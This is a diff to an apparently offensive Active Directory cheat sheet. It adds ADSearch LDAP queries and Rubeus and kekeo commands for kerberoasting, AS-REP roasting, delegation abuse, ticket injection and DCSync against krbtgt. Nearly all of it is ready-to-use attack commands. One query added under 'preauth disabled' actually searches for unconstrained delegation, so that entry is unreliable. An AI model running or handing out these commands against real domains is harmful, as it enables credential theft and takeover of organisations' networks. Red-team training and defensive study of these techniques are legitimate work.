@@ -109,6 +109,10 @@ Get-DomainUser -SPN | select samaccountname,serviceprincipalname
 Rubeus.exe kerberoast /stats
 ```
 
+```
+.\ADSearch.exe --search "(&(sAMAccountType=805306368)(servicePrincipalName=*))"
+```
+
 #### Reguest a TGS
 ```
 Rubeus.exe kerberoast /user:<SERVICEACCOUNT> /simple /domain <DOMAIN> /outfile:kerberoast_hashes.txt
@@ -176,6 +180,10 @@ Set-DomainObject -Identity <username> -Set @{serviceprincipalname=’<ops/whatev
 #### Enumerating accounts with kerberos preauth disabled
 ```
 Get-DomainUser -PreauthNotRequired -verbose | select samaccountname
+```
+
+```
+./ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
 ```
 
 #### Request encrypted AS-REP
@@ -451,6 +459,10 @@ Get-DomainComputer -UnConstrained
 Get-DomainComputer -UnConstrained | select samaccountname
 ```
 
+```
+.\ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
+```
+
 #### Check if any DA tokens are available on the unconstrained machine
 - Wait for a domain admin to login while checking for tokens
 ```
@@ -540,6 +552,10 @@ Get-Domaincomputer -TrustedToAuth
 Get-Domaincomputer -TrustedToAuth | select samaccountname, msds-allowedtodelegateto
 ```
 
+```
+.\ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
+```
+
 ### Constrained delegation User
 #### Rubeus calculate password hash
 - If only password is available calculate the hash
@@ -584,16 +600,28 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt /domain:<DOMAIN
 ```
 
 ### Constrained delegation Computer
+#### Rubeus request and inject TGT + TGS
+```
+.\Rubeus.exe s4u /impersonateuser:<USER> /msdsspn:cifs/<FQDN COMPUTER> /user:<COMPUTER>$ /aes256:<AES HASH> /opsec /altservice:<SECOND SERVICE> /ptt 
+```
+
+#### Rubeus Dump TGT + ask TGS for CIFS
+```
+.\Rubeus.exe triage
+.\Rubeus.exe dump \luid:<LUID> \service:<SERVICE>
+.\Rubeus.exe s4u /impersonateuser:<USER> /msdsspn:cifs/<FQDN COMPUTER> /user:<COMPUTER>$ /ticket:<BASE64 TGT> /nowrap
+```
+
 #### Requesting TGT with a PC hash
 ```
 ./kekeo.exe
-Tgt::ask /user:dcorp-adminsrv$ /domain:<DOMAIN> /rc4:<HAHS>
+Tgt::ask /user:<COMPUTERNAME>$ /domain:<DOMAIN> /rc4:<HASH>
 ```
 
 #### Requesting TGS
 No validation for the SPN specified
 ```
-Tgs::s4u /tgt:<kirbi file> /user:Administrator /service:<SERVICE ALLOWED TO DELEGATE/<MACHINE NAME>|ldap/<MACHINE NAME>
+Tgs::s4u /tgt:<kirbi file> /user:<USER> /service:<SERVICE ALLOWED TO DELEGATE/<MACHINE NAME>|ldap/<MACHINE NAME>
 ```
 
 #### Using mimikatz to inject TGS ticket and executing DCsync
